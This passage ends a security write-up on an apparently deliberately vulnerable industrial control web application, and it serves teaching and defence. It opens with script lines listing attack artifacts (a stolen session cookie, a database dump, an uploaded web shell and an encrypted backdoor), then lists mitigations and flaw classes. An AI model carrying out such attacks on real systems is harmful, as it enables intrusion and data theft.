echo "  - cookies.txt (session cookie)"
echo "  - users_dump.html (database extraction)"
echo "  - /tmp/test.php (uploaded web shell)"
echo "  - /tmp/large.bin (size bypass test)"
echo "  - /tmp/backdoor.php (encrypted payload)"
```

---

## Mitigation

All vulnerabilities in this version are fixed in the **PATCHED** version. See `PATCHED_SYSTEM_DOCUMENTATION.md` for detailed security implementations.

**Key Fixes**:
1. **SQL Injection**: All queries use parameterized statements
2. **File Upload**: Multi-layer validation, decrypt-then-scan
3. **Brute Force**: Rate limiting, account lockout, IP blocking
4. **Security Middleware**: Global checks before every request
5. **Comprehensive Logging**: Risk scoring, attack chains, recommendations
6. **Automated Response**: Configurable rules, reversible actions
7. **Security Management**: Full admin interface for incident response

---

## Conclusion

The vulnerable version demonstrates common web application security flaws in industrial control systems:
- **Input Validation Failures**: SQL injection, file upload bypass
- **Broken Authentication**: No brute force protection
- **Security Misconfiguration**: Missing middleware, incomplete validation
- **Insufficient Logging**: Limited attack visibility
- **Broken Access Control**: Weak role enforcement

These vulnerabilities are realistic and frequently found in production systems. The patched version demonstrates defense-in-depth security principles suitable for critical infrastructure.
